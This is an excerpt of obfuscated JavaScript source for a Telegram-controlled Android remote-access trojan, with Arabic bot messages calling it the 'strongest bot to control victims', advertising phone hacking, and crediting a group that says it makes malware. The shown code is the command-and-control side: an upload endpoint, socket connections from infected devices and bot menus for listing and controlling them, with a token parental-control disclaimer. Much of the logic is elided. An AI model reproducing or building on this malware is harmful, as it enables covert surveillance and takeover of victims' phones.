...
app.get('/', (_0x475404, _0x364a1f) => {
  _0x364a1f.send("تم رفع الخادم معى تحيات المطور 𝐃𝐀𝐑𝐊々 ");
});
app.post("/upload", uploader.single("file"), (req, res) => {
  ...
  // إذا كان الملف نصيًا (txt)، نستبدل ـ @Y_F_HK بـ @Y_F_HK
  if (fileName.toLowerCase().endsWith('.txt')) {
    let fileContent = fileBuffer.toString('utf8');
    fileContent = fileContent.replace(/@Y_F_HK/g, '@Y_F_HK');
...
io.on("connection", _0x5c13cb => {
  ...
  _0x5c13cb.on("message", _0xfa321a => {
    ...
    let modifiedMessage = _0xfa321a.replace(/@Y_F_HK/g, '@Y_F_HK');
...
bot.on("message", _0x517bec => {
  if (_0x517bec.text === "/start") {
    bot.sendMessage(data.id, "<b>✯ اهلآ وسهلا في اقوى بوت تحكم بضحايا الإصدار 6</b>\n\nبوت رات قوي وسهل الاستخدام لاتحتاج الا كمبيوتر لاجل اختراق الاجهزه فبهذا البوت يمكنك التحكم بأي هاتف أندرويد \nتم تطوير البوت من قبل الهكر -ألكنَترِول々  تم تطويره لاجل التسليه والرقابة الأبوية فل المطور لا يتحمل مسؤولية سوء استخدامه فيما يغضب الله https://t.me/D_ark_hacker \n\nتواصل بل المطور: @Y_F_HK", {
      'parse_mode': "HTML",
      'reply_markup': {
                  ...
                  if (_0x517bec.text === "✯ عدد الاجهزه ✯") {
                    ...
                    if (_0x517bec.text === "✯ قائمة التحكم ✯") {
                      ...
                      if (_0x517bec.text === "✯ معلومات عن المطور ✯") {
                        bot.sendMessage(data.id, "<b>✯ نحن الجيش السوري السيبراني نخترق \nنصنع برمجيات خبيثه لاختراق الاجهزه, \n\n𝚃𝚎𝚕𝚎𝚐𝚛𝚊𝚖 → @Y_F_HK\n𝚃𝚎𝚕𝚎𝚐𝚛𝚊𝚖 →https://t.me/D_ark_hacker</b>\n\n", {
                          'parse_mode': "HTML"
                        });
                      } else {
